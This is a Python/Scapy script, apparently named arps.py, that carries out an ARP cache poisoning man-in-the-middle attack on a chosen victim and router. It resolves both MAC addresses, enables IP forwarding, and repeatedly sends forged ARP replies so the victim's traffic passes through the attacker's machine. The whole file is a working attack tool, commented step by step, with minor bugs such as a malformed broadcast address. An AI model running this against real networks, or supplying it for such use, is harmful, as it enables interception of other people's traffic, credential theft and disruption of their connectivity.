#!/usr/bin/python

import argparse
import signal
import logging
import os
import re
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *



def main():
    #checking if not root!
    if os.geteuid() != 0:
        sys.exit("[!] please run as root")

    #checking for arguments.
    args = sys.argv[1:]

    if(len(args) < 1):
        print("ERROR EXITING : request pattern - python arps.py -v IPvictim -r IProuter")
        sys.exit(1)
    
    if((args[0] != '-v' and args[0] != '--victim') or (args[2] != '-r' and args[2] != '--router')):
        print("ERROR EXITING : request pattern - python arps.py -v IPvictim -r IProuter")
        sys.exit(1)
    else:
        ipvic = args[1]
        iprou = args[3]
    macrou = getmac(iprou)
    macvic =  getmac(ipvic)
    

#if ctrl+C is pressed, program is terminating.
    a = ipforwardchange()

    def signal_handler(signal, frame):
        print('exiting.. restoring default settings')
	s = ipforwardchange()
        restore(ipvic, iprou,macvic, macrou)
        
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    while 1:
        poisionarp(ipvic, iprou, macvic, macrou)
        time.sleep(1.5)
        print("poisioning the victim...")
        print("posioning the router...")
      

def getmac(ip):
    #gets the macadress of the ip given.
    (ans,uans) = srp(Ether(dst="ff:ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout = 5, retry = 3)
    #ans - the answers which the packet gets and recives, uans what the router didnt recieve
    #what happaens is that i need someone to tell me who has my address, the router or the victim
    #send his or her mac address
    #now in order to get the mac address we need to go thorugh all the packet(from last to first layer - the one we
    #want and search for the Ether.src
    for send,recieve in ans:
        #sprintf - a method of the scapy packet instance (s for sent r for recieve , gets a string which return the
        #corresponding value - man it for more details.
        return recieve.sprintf("%Ether.src%")
    

def poisionarp(ipvic, iprou, macvic, macrou):
    #poisioning the chache of both the victim and the router.
    #2 - is at / 1 - who is ....
    #verbose - function if 0 will send packet silently
    send(ARP(op=2, pdst = ipvic, psrc = iprou, hwdst = macvic), verbose = 0)
    send(ARP(op=2, pdst = iprou, psrc = ipvic, hwdst = macrou), verbose = 0)

def restore(ipvic, iprou, macvic, macrou):
    #restoring in case of an exit
    send(ARP(op=2, pdst = ipvic, psrc = iprou, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = macvic), count = 3)
    send(ARP(op=2, pdst = iprou, psrc = ipvic, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = macrou), count = 3)
    sys.exit("restoring, exiting")

def ipforwardchange():
    #changing ip forwarding , if it's on its turned off and if its on its turned off
    #returns true if on and false if off.
    fp = file("/proc/sys/net/ipv4/ip_forward", 'rU')
    st = fp.read()
    fp.close()
    change = 1 - int(st[0])
    fp = file("/proc/sys/net/ipv4/ip_forward", 'w')
    fp.write(str(change) + '\n')
    fp.close()

    if(change == 1):
        return 'true'
    else:
        return 'false'
    
    

    
    


  
  
      
      























if __name__ == '__main__':
  main()
